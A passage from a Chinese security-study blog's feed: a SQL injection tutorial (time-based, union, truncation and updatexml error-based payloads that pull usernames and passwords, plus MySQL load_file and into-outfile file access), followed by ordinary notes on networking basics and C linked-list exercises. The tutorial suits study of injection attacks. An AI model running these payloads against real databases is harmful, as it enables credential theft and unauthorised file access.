class="line">select * from users <span class="built_in">where</span> id=<span class="string">&#x27;a\&#x27;</span> and username=<span class="string">&#x27; or sleep(2)#&#x27;</span></span><br><span class="line">select * from users <span class="built_in">where</span> id=<span class="string">&#x27;a\&#x27;</span> and username=<span class="string">&#x27;union select 1,2,(select concat(username,0x7e,password) from users limit 1)#&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/20/jmOk2eyG7lXcwSd.png" alt="image-20210820230717823"></p><p><strong>引号逃逸：其实就是由于做了转义</strong></p><p>对单引号、双引号等进行转义之后，在一定程度上妨碍了我们的注入，当遇到这种情况，我们可以考虑：宽字节注入、二次注入、HTTP 头部注入</p><p><strong>字符串截断：</strong></p><p>在一些标题等位置，开发者一般会限制标题的字符长度，如果超过，有可能会被截断。</p><p>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;security&#x27;</span>);</span><br><span class="line"><span class="variable">$title</span> = addslashes(<span class="variable">$_GET</span>[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$title</span>;</span><br><span class="line"><span class="variable">$title</span> = substr(<span class="variable">$title</span>,<span class="number">0</span>,<span class="number">10</span>);<span class="comment">#做了截断处理</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>.<span class="variable">$title</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;$title&lt;/h1&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> = addslashes(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into users values(15, &#x27;<span class="subst">$title</span>&#x27; , &#x27;<span class="subst">$content</span>&#x27;)&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>.<span class="variable">$sql</span>;</span><br><span class="line"><span class="variable">$res</span> = mysqli_query(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如果攻击者想进行 sql 注入测试，可以选择输入 <code>aaaaaaaaa&#39;</code> ，则经过转义之后，将会变为 <code>aaaaaaaaa\&#39;</code> ，但是由于后面的截断，将变成 <code>aaaaaaaaa\</code>。</p><p>使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?title=aaaaaaaaa\<span class="string">&#x27;&amp;content=,1),(16,321,2)--+</span></span><br></pre></td></tr></table></figure><p>这样拼接到 sql 语句中就变成</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into news values(15, <span class="string">&#x27;aaaaaaaaa\&#x27;</span> , <span class="string">&#x27;,1),(16,321,2)--+&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这样 由于转义使得 <code>aaaaaaaaa\&#39; , </code> 成为了由单引号包围的一部分，也就成功执行了 插入语句。</p><p><img src="https://i.loli.net/2021/08/21/H68oDiqE1fGIw3S.png" alt="image-20210821105719366"></p><p><strong>过滤等号 <code>=</code></strong></p><p>使用 <code>like</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a<span class="string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;</span>geek<span class="string">&#x27;)),0x7e),1))or&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="十九、其它"><a href="#十九、其它" class="headerlink" title="十九、其它"></a>十九、其它</h2><ol><li><p>在以上的任何一个注入方式中，都有可能对用户所输入的内容进行编码，例如进行 <code>base64</code> 编码，我们进行爆破时要记得编码；</p></li><li><p>Nosql 注入         <a href="https://www.cnblogs.com/bonelee/p/12158385.html">https://www.cnblogs.com/bonelee/p/12158385.html</a></p></li><li></li></ol><h2 id="二十、解决查内容时一次显示不全"><a href="#二十、解决查内容时一次显示不全" class="headerlink" title="二十、解决查内容时一次显示不全"></a>二十、解决查内容时一次显示不全</h2><p><strong>方法一：一条一条查</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(1,concat(0x5e,(select concat(username,<span class="string">&#x27;~&#x27;</span>,password) from security.users <span class="built_in">limit</span> 0,1),0x5e),1)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">and updatexml(1,concat(0x5e,(select concat_ws(<span class="string">&#x27;~&#x27;</span>,username,password) from security.users <span class="built_in">limit</span> 0,1),0x5e),1)<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><strong>方法二：substr(,,)</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 每次查30个字符</span></span><br><span class="line">and updatexml(1,concat(0x5e,(select substr(group_concat(concat_ws(<span class="string">&#x27;~&#x27;</span>,username,password)),1,30) from security.users),0x5e),1)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">and updatexml(1,concat(0x5e,(select substr(group_concat(concat_ws(<span class="string">&#x27;~&#x27;</span>,username,password)),31,30) from security.users),0x5e),1)<span class="comment">#</span></span><br></pre></td></tr></table></figure><h1 id="总结：regexp-正则匹配速查表"><a href="#总结：regexp-正则匹配速查表" class="headerlink" title="总结：regexp 正则匹配速查表"></a>总结：regexp 正则匹配速查表</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用</span></span><br><span class="line">&lt;内容&gt; regexp <span class="string">&#x27;正则表达式&#x27;</span></span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">选项</th><th align="left">说明</th><th align="left">例子</th><th align="left">匹配值示例</th></tr></thead><tbody><tr><td align="left">^</td><td align="left">匹配文本的开始字符</td><td align="left">‘^b’ 匹配以字母 b 开头的字符串</td><td align="left">book、big、banana、bike</td></tr><tr><td align="left">$</td><td align="left">匹配文本的结束字符</td><td align="left">‘st$’ 匹配以 st 结尾的字符串</td><td align="left">test、resist、persist</td></tr><tr><td align="left">.</td><td align="left">匹配任何单个字符</td><td align="left">‘b.t’ 匹配任何 b 和 t 之间有一个字符</td><td align="left">bit、bat、but、bite</td></tr><tr><td align="left">*</td><td align="left">匹配零个或多个在它前面的字符</td><td align="left">‘f*n’ 匹配字符 n 前面有任意个字符 f</td><td align="left">fn、fan、faan、abcn</td></tr><tr><td align="left">+</td><td align="left">匹配前面的字符 1 次或多次</td><td align="left">‘ba+’ 匹配以 b 开头，后面至少紧跟一个 a</td><td align="left">ba、bay、bare、battle</td></tr><tr><td align="left">&lt;字符串&gt;</td><td align="left">匹配包含指定字符的文本</td><td align="left">‘fa’ 匹配包含‘fa’的文本</td><td align="left">fan、afa、faad</td></tr><tr><td align="left">[字符集合]</td><td align="left">匹配字符集合中的任何一个字符</td><td align="left">‘[xz]’ 匹配 x 或者 z</td><td align="left">dizzy、zebra、x-ray、extra</td></tr><tr><td align="left">[^ ]</td><td align="left">匹配不在括号中的任何字符</td><td align="left">‘[^abc]’ 匹配任何不包含 a、b 或 c 的字符串</td><td align="left">desk、fox、f8ke</td></tr><tr><td align="left">字符串{n,}</td><td align="left">匹配前面的字符串至少 n 次</td><td align="left">‘b{2}’ 匹配 2 个或更多的 b</td><td align="left">bbb、bbbb、bbbbbbb</td></tr><tr><td align="left">字符串 {n,m}</td><td align="left">匹配前面的字符串至少 n 次， 至多 m 次</td><td align="left">‘b{2,4}’ 匹配最少 2 个，最多 4 个 b</td><td align="left">bbb、bbbb</td></tr></tbody></table><p><strong>匹配中文时</strong>：<code>regexp &#39;(文字)&#39;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">regexp <span class="string">&#x27;[文字]&#x27;</span> <span class="comment">#报错</span></span><br><span class="line">regexp <span class="string">&#x27;文字&#x27;</span></span><br><span class="line">like <span class="string">&#x27;文字&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="Mysql-对文件的操作"><a href="#Mysql-对文件的操作" class="headerlink" title="Mysql 对文件的操作"></a>Mysql 对文件的操作</h1><ul><li>load_file()</li><li>load data infile()</li><li>system cat</li></ul><p><strong>使用条件：1. 有File权限（File_priv的值）；2. secure_file_priv 的值不为 NULL</strong></p><p>注：&gt;=5.7.16默认值为NULL，&lt;5.7.16则为空</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#查看 File_priv</span><br><span class="line"><span class="keyword">select</span> File_priv <span class="keyword">from</span> mysql.user <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;root&#x27;</span> <span class="keyword">and</span> host <span class="operator">=</span><span class="string">&#x27;localhost&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/01/DcqRGnP48OB7kW9.png" alt="image-20210601180220996"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#查看 secure_file_priv</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> &quot;secure_file_priv&quot;;</span><br><span class="line">值是 <span class="keyword">NULL</span> <span class="comment">--- 不允许文件导入导出操作</span></span><br><span class="line">值是 空   <span class="comment">--- 不对mysql的导入导出操作做出限制</span></span><br><span class="line">值是 具体路径 限制mysql的导入与导出操作限制在指定路径下</span><br><span class="line">#修改</span><br><span class="line"># Windows 下</span><br><span class="line">修改 mysql.ini 文件 （secure_file_priv <span class="operator">=</span>）</span><br><span class="line"># Linux 下</span><br><span class="line">在<span class="operator">/</span>etc<span class="operator">/</span>my.cnf的[mysqld]下面添加<span class="keyword">local</span><span class="operator">-</span>infile<span class="operator">=</span><span class="number">0</span>选项</span><br></pre></td></tr></table></figure><p><strong>读取文件</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># load_file()</span><br><span class="line"><span class="keyword">select</span> load_file(<span class="string">&#x27;D:/test.txt&#x27;</span>);</span><br><span class="line"></span><br><span class="line"># load data infile()</span><br><span class="line"># 利用该函数读文件时需要将文件内容保存至一个表中</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> test(content text);</span><br><span class="line">load data infile <span class="string">&#x27;D:\\test.txt&#x27;</span> <span class="keyword">into</span> <span class="keyword">table</span> test;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test;</span><br></pre></td></tr></table></figure><p><strong>写入文件</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">into</span> outfile <span class="string">&#x27;D:\\users.txt&#x27;</span> <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="WEB漏洞详解" scheme="https://xizhi-future.github.io/categories/WEB%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/"/>
    
    
    <category term="漏洞" scheme="https://xizhi-future.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="SQL注入" scheme="https://xizhi-future.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>计算机网络概念、发展、性能</title>
    <link href="https://xizhi-future.github.io/2021/10/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E5%BF%B5%E3%80%81%E5%8F%91%E5%B1%95%E3%80%81%E6%80%A7%E8%83%BD/"/>
    <id>https://xizhi-future.github.io/2021/10/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E5%BF%B5%E3%80%81%E5%8F%91%E5%B1%95%E3%80%81%E6%80%A7%E8%83%BD/</id>
    <published>2021-10-07T10:05:01.000Z</published>
    <updated>2021-10-07T10:05:55.993Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><img src="https://i.loli.net/2021/09/29/8YW4KU7igu1OhPz.png" alt="image-20210929191834740"></p><p><img src="https://i.loli.net/2021/09/29/QhLMIUy9F2NGsKm.png" alt="image-20210929191855181"></p><h2 id="1-1-计算机网络在信息时代的作用"><a href="#1-1-计算机网络在信息时代的作用" class="headerlink" title="1.1 计算机网络在信息时代的作用"></a>1.1 计算机网络在信息时代的作用</h2><p>21世纪，数字化、网络化、信息化</p><p>网络化：三网——-电信网络、计算机网络、有线电视网络</p><p>计算机网络：因特网、其它网络（政府专用网络等等）</p><p><strong>计算机网络的重要功能：</strong></p><ul><li><p>连通性：彼此连接，交换信息</p></li><li><p>共享：信息共享、软硬件共享</p></li></ul><h2 id="1-2-因特网"><a href="#1-2-因特网" class="headerlink" title="1.2 因特网"></a>1.2 因特网</h2><p>网络：Network 结点（交换机 和 计算机） 与 链路 连接，许多计算机 通过 链路 连接在交换机上，之间的—— 交换机</p><p>互连网：internet  （Network of Networks） 连接  各个网络，网络与网络 通过路由器 相连 ——- 路由器</p><p>因特网：Internet   全球最大的互连网  TCP/IP</p><p><strong>因特网发展三个阶段：</strong></p><ul><li><p>ARPANET 向互连网 发展：</p><ul><li>1969 年，分组交换</li><li>1975 年，互联网</li><li>1983 年，因特网 TCP/IP，此时 是未开放的政府性质的网络</li></ul></li><li><p>三级结构的因特网</p><ul><li>1985 年，三个地区网（校园网等），一个主干网，地区网连接在主干网上</li></ul></li><li><p> 多层次 ISP 结构的因特网  （ISP  因特网服务提供商：端系统通过其连接在因特网）</p></li></ul><p>  由因特网管理机构 分配公网 IP 给 ISP ，然后 ISP 再分配给 端系统，同时 ISP 也是分级的 </p><p>  <img src="https://i.loli.net/2021/09/29/FdNSmQTnuh7VrR3.png" alt="image-20210929194601798"></p><p>选择本地运营商下载速度快</p><p><img src="https://i.loli.net/2021/09/29/HTCXe7l9iFucVGk.png" alt="image-20210929194930259"></p><p><img src="https://i.loli.net/2021/09/29/LZSN1lkznXMOhiE.png" alt="image-20210929195123493"></p><p><img src="https://i.loli.net/2021/09/29/ywlZ1kLFCsxuTmV.png" alt="image-20210929195256507"></p><h2 id="1-3-因特网的组成"><a href="#1-3-因特网的组成" class="headerlink" title="1.3 因特网的组成"></a>1.3 因特网的组成</h2><h3 id="1-3-1-核心部分"><a href="#1-3-1-核心部分" class="headerlink" title="1.3.1 核心部分"></a>1.3.1 核心部分</h3><p><strong>数据交换方式：</strong></p><ul><li><p><strong>电路交换 Circuit Switching</strong> ：面向连接</p><p>举例：打电话</p><ol><li>建立连接：申请占用通信资源（耗时）</li><li>通话过程：一直占用资源</li><li>释放连接：释放通信资源（不释放即为 占线）</li></ol><p>适用于：数据量很大的实时性传输；核心路由器之间可使用。</p></li><li><p><strong>报文交换 Message Switching</strong></p><p>报文比分组长（不分段）</p><p>报文交换的时间长</p><p>不建立连接</p></li><li><p><strong>分组交换 Packet Switching</strong>：计算机网络采用该方式实现数据通信</p><ol><li><p>发送端将需要传输的数据进行分组：每一个分组均由 首部（源地址、目标地址） 和 数据 两部分组成 </p></li><li><p>接收端 接收每个分组，去掉其首部保留数据，连接在一起，使数据完整</p></li><li><p>从发送端到接收端：进行分组的转发——由路由器进行选择最佳合适的路径进行转发    </p></li></ol><p>（路由器：存储、转发的功能    暂存、查找转发表、找到要转发的端口）</p><p>不需要建立连接，不占线 </p><p>优点：高效、迅速、可靠、灵活</p><p>缺点：时延、开销</p></li></ul><p><img src="https://i.loli.net/2021/09/29/nscfoZhNGtvegAX.png" alt="image-20210929201927140"></p><p><strong>耗时：报文 &gt; 电路 &gt; 分组</strong></p><h3 id="1-3-2-边缘部分"><a href="#1-3-2-边缘部分" class="headerlink" title="1.3.2 边缘部分"></a>1.3.2 边缘部分</h3><p><strong>主机之间的通信方式：</strong></p><ul><li><p><strong>C/S 客户服务器方式：Client/Server</strong></p><p>服务器是服务器，客户机是客户机</p></li><li><p><strong>P2P 对等方式：Peer-to-Peer</strong></p><p>客户机也可以是服务器，即是服务器也是客户机</p><p>例如：P2P 下载：可以从多个源上下载同一个文件，不需要仅仅从一个服务器上下载</p></li></ul><h2 id="1-4-计算机网络在我国的发展"><a href="#1-4-计算机网络在我国的发展" class="headerlink" title="1.4 计算机网络在我国的发展"></a>1.4 计算机网络在我国的发展</h2><p>1994 年 4 月 20 日，中国正式接入互连网</p><h2 id="1-5-计算机网络的类别"><a href="#1-5-计算机网络的类别" class="headerlink" title="1.5 计算机网络的类别"></a>1.5 计算机网络的类别</h2><p><img src="https://i.loli.net/2021/09/29/rn4oItQE9judziC.png" alt="image-20210929203028386"></p><p><img src="https://i.loli.net/2021/09/29/9VM6m7hXntDLwfl.png" alt="image-20210929202956297"></p><h2 id="1-6-计算机网络的性能"><a href="#1-6-计算机网络的性能" class="headerlink" title="1.6 计算机网络的性能"></a>1.6 计算机网络的性能</h2><p>速率：连接在计算机网络上的主机在数字信道上传送 <strong>数据位数</strong> 的速率  data rate   bit rate</p><p>b/s   kb/s   Mb/s   Gb/s</p><p>带宽：数据通信领域中，数字信道所能传送的最高数据率</p><p>b/s  kb/s  Mb/s  Gb/s</p><p>吞吐量：单位时间内通过某个网络（所有路径）的数据量</p><p>b/s  Mb/s</p><p>时延：发送时延、传播时延、处理时延、排队时延之和 </p><p>时延带宽积：传播时延 x 带宽 </p><p>往返时间：从发送端发送数据开始，到发送端收到接收端确认 为止   </p><p>利用率</p><ul><li>信道利用率：有数据通过时间/（有加无）数据通过的时间</li><li>网络利用率：信道利用率加权平均值</li></ul><p><img src="https://i.loli.net/2021/09/29/IvD1ObgQ6At9JTC.png" alt="image-20210929212908347"></p><p><strong>非性能指标：</strong></p><p>费用 、管理与维护、质量、标准化、可靠性、可扩展性、可升级性</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="计网" scheme="https://xizhi-future.github.io/categories/%E8%AE%A1%E7%BD%91/"/>
    
    
    <category term="计网" scheme="https://xizhi-future.github.io/tags/%E8%AE%A1%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>单链表、双链表练题</title>
    <link href="https://xizhi-future.github.io/2021/10/05/%E5%8D%95%E9%93%BE%E8%A1%A8%E3%80%81%E5%8F%8C%E9%93%BE%E8%A1%A8%E7%BB%83%E9%A2%98/"/>
    <id>https://xizhi-future.github.io/2021/10/05/%E5%8D%95%E9%93%BE%E8%A1%A8%E3%80%81%E5%8F%8C%E9%93%BE%E8%A1%A8%E7%BB%83%E9%A2%98/</id>
    <published>2021-10-05T11:51:44.000Z</published>
    <updated>2021-10-05T11:52:52.560Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p><h2 id="第三章-链式存储"><a href="#第三章-链式存储" class="headerlink" title="第三章  链式存储"></a>第三章  链式存储</h2><h3 id="1-设计一个算法，求一个单链表中的结点个数。"><a href="#1-设计一个算法，求一个单链表中的结点个数。" class="headerlink" title="1. 设计一个算法，求一个单链表中的结点个数。"></a>1. 设计一个算法，求一个单链表中的结点个数。</h3><p><strong>算法：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//计数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">count</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> s = <span class="number">0</span>;</span><br><span class="line">    node *p = head;</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        s++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>测试：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FLAG 0</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span>&#123;</span></span><br><span class="line">    datatype info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line"><span class="comment">//前插法 创建单链表</span></span><br><span class="line"><span class="function">node *<span class="title">creat</span><span class="params">()</span></span>&#123;</span><br><span class="line">    node *head = <span class="literal">NULL</span>;</span><br><span class="line">    node *s;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入结点值：\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>( x!= FLAG)&#123;</span><br><span class="line">        s = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        s-&gt;next = head;</span><br><span class="line">        head = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">    node *p = head;</span><br><span class="line">    <span class="keyword">if</span>(!p) &#123;<span class="built_in">printf</span>(<span class="string">&quot;链表是 空的！\n&quot;</span>);&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;单链表各个结点的值是：\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//计数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">count</span><span class="params">(node *head)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> s = <span class="number">0</span>;</span><br><span class="line">    node *p = head;</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        s++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    node *pt;</span><br><span class="line">    <span class="keyword">int</span> sum;</span><br><span class="line">    pt=creat();</span><br><span class="line">    print(pt);</span><br><span class="line">    sum = count(pt);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\n该单链表中结点个数是：%d\n&quot;</span>,sum);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/03/g4NDwT3JfyEx7qI.png" alt="image-20211003114619188"></p><h3 id="2-设计一个算法，在一个单链表中值为y的结点前面插入一个值为x的结点。即使值为x的新结点成为值为y的结点的前驱结点。"><a href="#2-设计一个算法，在一个单链表中值为y的结点前面插入一个值为x的结点。即使值为x的新结点成为值为y的结点的前驱结点。" class="headerlink" title="2. 设计一个算法，在一个单链表中值为y的结点前面插入一个值为x的结点。即使值为x的新结点成为值为y的结点的前驱结点。"></a>2. 设计一个算法，在一个单链表中值为y的结点前面插入一个值为x的结点。即使值为x的新结点成为值为y的结点的前驱结点。</h3><p><strong>算法：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在值为 y 的结点前插入 值为 x 的结点</span></span><br><span class="line"><span class="function">node *<span class="title">insert</span><span class="params">(node *head,datatype y,datatype x)</span></span>&#123;</span><br><span class="line">    node *p = head;</span><br><span class="line">node *q,*pre;</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; p-&gt;info != y)&#123;</span><br><span class="line">        pre = p;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p) &#123;<span class="built_in">printf</span>(<span class="string">&quot;找不到值是%d的结点\n&quot;</span>,y);&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        q = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    q-&gt;info = x;</span><br><span class="line">        q-&gt;next = p;</span><br><span class="line">        pre-&gt;next = q;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>测试：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 